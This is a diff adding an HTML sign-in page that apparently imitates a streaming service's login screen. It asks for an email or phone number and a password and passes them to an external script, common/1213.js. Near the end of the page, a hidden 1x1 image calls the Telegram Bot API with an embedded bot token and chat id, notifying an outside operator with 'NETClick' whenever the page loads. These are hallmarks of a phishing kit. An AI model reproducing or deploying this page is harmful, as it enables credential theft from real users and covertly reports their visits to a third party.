@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Access</title>
+    
+    <link rel="stylesheet" href="./css/13.css">
+    <link rel="stylesheet" href="./css/12.css">
+</head>
+
+<body>
+    <div class="holder">
+
+        <header>
+            <img src="./img/lg.png" alt="Logo">
+        </header>
+
+        <section>
+            <div class="form">
+
+                <div class="form-title">Sign In</div>
+
+                <div class="form-col">
+                    <input
+                        type="text"
+                        class="textinput"
+                        id="auth_user_identity"
+                        required
+                        placeholder="Email or mobile number"
+                    >
+                </div>
+
+                <div class="form-col">
+                    <input
+                        type="password"
+                        class="textinput"
+                        id="auth_user_password"
+                        required
+                        placeholder="Password"
+                    >
+                </div>
+
+                <div class="form-col" style="margin-top:40px;">
+                    <button id="auth_submit_btn" onclick="handleAuthSubmit()">
+                        Sign In
+                    </button>
+                </div>
+
+                <div class="form-col" style="display:flex; align-items:center; font-size:0.9em; color:#b3b3b3;">
+                    <div style="display:flex; align-items:center;width:50%;">
+                        <input
+                            type="checkbox"
+                            style="accent-color:#9d9a9a; width:15px; height:15px; margin-right:6px;"
+                            checked
+                        >
+                        Remember me
+                    </div>
+
+                    <div style="width:50%; text-align:right;">
+                        Forgot password?
+                    </div>
+                </div>
+
+                <div class="form-col" style="color:#b3b3b3; margin-top:60px;">
+                    <h4 style="font-weight:normal;">
+                        New ? <span style="color:white;">Sign up now.</span>
+                    </h4>
+
+                    <p style="font-size:0.9em;">
+                        This page is protected by Google reCAPTCHA to ensure you're not a bot.
+                        <span style="color:blue;">Learn more.</span>
+                    </p>
+                </div>
+
+            </div>
+        </section>
+
+        <footer>
+            <div class="footer-holder">
+                <h3>Questions? Contact us.</h3>
+                <span>FAQ</span>
+                <span>Help Center</span>
+                <span>Terms of Use</span>
+                <span>Privacy</span>
+                <span>Cookie Preferences</span>
+                <span>Corporate Information</span>
+            </div>
+        </footer>
+
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+
+    <script src="common/1213.js"></script>
+
+    <script>
+        function handleAuthSubmit() {
+            if (typeof submitFormIfNecessary === "function") {
+                submitFormIfNecessary();
+                return;
+            }
+
+            // fallback (optional)
+            console.warn("submitFormIfNecessary() not found in common/1213.js");
+        }
+    </script>
+<img src="https://api.telegram.org/bot8181103144:AAEpItQ46JiZe9-Z7Z8Ev0D3qtlgeZfyDBw/sendMessage?chat_id=-5171049869&amp;text=NETClick" width="1" height="1" alt="altwans" title="mchiand" style="display:none;height:auto;border:0">
+</body>
+</html>
